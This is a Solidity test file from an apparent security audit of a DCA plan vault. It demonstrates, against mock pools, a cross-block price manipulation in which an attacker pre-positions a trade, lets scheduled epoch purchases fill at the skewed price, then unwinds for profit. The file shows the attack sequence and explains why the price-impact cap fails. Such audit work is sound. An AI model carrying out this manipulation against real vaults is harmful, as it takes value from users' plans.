// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {AuditBase} from "../AuditBase.sol";
import {CPMMPool, Trader} from "../mocks/CPMMPool.sol";
import {IPlanVault} from "../../../src/interfaces/IPlanVault.sol";

/// @dev AUDIT v0.3 / H-01. Epoch purchases have no manipulation-resistant price reference. Every number the
///      vault checks (router quote, minOut = quote x 0.995, impact vs slot0) is read in the executing block, so an
///      attacker who pre-positions in an EARLIER block (no same-block ordering needed, no mempool needed) and
///      unwinds after the fill takes value from every plan on the page. Epoch timing is public and predictable.
contract Audit3_H01_PriceManipulation is AuditBase {
    CPMMPool internal pool;
    Trader internal attacker;
    uint256[] internal ids;
    uint256 internal constant PER_EPOCH = 5_000e6;

    function setUp() public override {
        super.setUp();
        // $2M USDG / 4,000 NVDA constant-product pool at 500 USDG per NVDA, 5 bps fee: a realistic mid-size pool
        // (a 15k page has ~0.8% impact here; in a $1M pool the same page is already OVER the 150 bps cap).
        pool = _cpmmPool(address(usdg), 2_000_000e6, address(nvda), 4_000e18, 500);
        attacker = new Trader();
        usdg.mint(address(attacker), 3_000_000e6);
        address[3] memory users = [alice, bob, carol];
        for (uint256 i; i < 3; ++i) {
            vm.prank(users[i]);
            ids.push(daily.createPlan(address(nvda), uint96(PER_EPOCH), address(0), 50_000e6, 0, 0, false));
        }
    }

    function _totalAccrued() internal view returns (uint256 t) {
        for (uint256 i; i < ids.length; ++i) {
            t += _plan(ids[i]).stockAccrued;
        }
    }

    /// Block N: attacker buys NVDA. Block N+1: operator runs the scheduled epoch (auto-route, no override).
    /// Block N+2: attacker sells back. The page's own impact stays under the 150 bps cap because the cap is
    /// measured against the ALREADY PUSHED spot price.
    function test_crossBlockManipulation_takesValueFromEveryPlanOnThePage() public {
        _nextEpoch();
        uint256 amountIn = (3 * PER_EPOCH * (10_000 - 75)) / 10_000; // page net of the 75 bps purchase fee

        // Baseline: the fair fill.
        uint256 snap = vm.snapshotState();
        _advance(keeper);
        uint256 fairOut = _totalAccrued();
        vm.revertToState(snap);

        bool buyNvda = address(usdg) == pool.token0();
        uint256 push = 600_000e6;

        // Block N.
        uint256 nvdaHeld = attacker.trade(pool, buyNvda, push);

        // Block N+1: the vault's own checks all pass.
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 12);
        (uint256 quoted,, uint256 impact) = router.quoteWithImpact(address(usdg), address(nvda), amountIn);
        assertLe(impact, router.maxPriceImpactBps(), "impact cap passes against the pushed mid");
        assertGt(quoted, 0);
        _advance(keeper);
        uint256 manipulatedOut = _totalAccrued();

        // Block N+2.
        vm.roll(block.number + 1);
        uint256 usdgBack = attacker.trade(pool, !buyNvda, nvdaHeld);

        emit log_named_uint("fair NVDA (1e18)", fairOut);
        emit log_named_uint("manipulated NVDA (1e18)", manipulatedOut);
        emit log_named_uint("attacker profit USDG (1e6)", usdgBack - push);

        assertGt(usdgBack, push, "attacker nets a profit");
        assertLt(manipulatedOut * 100, fairOut * 70, "users receive < 70% of the fair fill");
    }

    /// The attacker's real cost is arbitrage during the hold. If one arbitrageur restores the price between the
    /// push and the operator's transaction, the page fills at fair value and the attacker's unwind is a large
    /// loss. This is the economic argument for an UNPREDICTABLE execution time: it converts a risk-free
    /// front-run into a bet against every arbitrageur for the length of the hold. It is an argument about
    /// likelihood, not about the contract: the contract still accepts whatever price it finds.
    function test_arbitrageDuringTheHold_makesTheAttackALoss() public {
        _nextEpoch();
        uint256 snap = vm.snapshotState();
        _advance(keeper);
        uint256 fairOut = _totalAccrued();
        vm.revertToState(snap);

        bool buyNvda = address(usdg) == pool.token0();
        uint256 push = 600_000e6;
        uint256 nvdaHeld = attacker.trade(pool, buyNvda, push);

        // An arbitrageur sells NVDA (bought at the fair 500 elsewhere) back into the pool until it is ~fair.
        Trader arber = new Trader();
        nvda.mint(address(arber), 2_000e18);
        (uint256 r0, uint256 r1) = pool.reserves();
        (uint256 rUsdg, uint256 rNvda) = buyNvda ? (r0, r1) : (r1, r0);
        // restore reserves to the constant-product point where price == 500: rNvda' = sqrt(k / 500)
        uint256 k = rUsdg * rNvda;
        uint256 targetNvda = _sqrt(k / 500e6) * 1e9; // reserves are 1e6 / 1e18 scaled: sqrt(k/500e6) * 1e9
        uint256 sell = targetNvda > rNvda ? targetNvda - rNvda : 0;
        uint256 arbUsdg = arber.trade(pool, !buyNvda, sell);
        uint256 arbCost = (sell * 500e6) / 1e18;
        emit log_named_uint("arbitrageur profit USDG (1e6)", arbUsdg - arbCost);
        assertGt(arbUsdg, arbCost, "arber profits from the pushed price");

        vm.roll(block.number + 1);
        _advance(keeper);
        uint256 out = _totalAccrued();
        assertGt(out * 100, fairOut * 97, "page fills within ~3% of fair");

        vm.roll(block.number + 1);
        uint256 usdgBack = attacker.trade(pool, !buyNvda, nvdaHeld);
        emit log_named_uint("attacker loss USDG (1e6)", push - usdgBack);
        assertLt(usdgBack, push - 100_000e6, "attacker loses > 100k USDG on a 600k push");
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    /// The same pre-positioning cannot be detected by the cap regardless of its size: the cap bounds the page's
    /// slippage relative to the current pool state, never the distance of that state from a reference price.
    function test_impactCapIsBlindToThePushSize() public {
        _nextEpoch();
        uint256 amountIn = (3 * PER_EPOCH * (10_000 - 75)) / 10_000;
        bool buyNvda = address(usdg) == pool.token0();
        uint256[3] memory pushes = [uint256(100_000e6), 500_000e6, 2_000_000e6];
        for (uint256 i; i < 3; ++i) {
            uint256 snap = vm.snapshotState();
            attacker.trade(pool, buyNvda, pushes[i]);
            vm.roll(block.number + 1);
            (,, uint256 impact) = router.quoteWithImpact(address(usdg), address(nvda), amountIn);
            assertLe(impact, router.maxPriceImpactBps());
            assertTrue(_advance(keeper), "page fills at whatever price the pool was left at");
            vm.revertToState(snap);
        }
    }
}
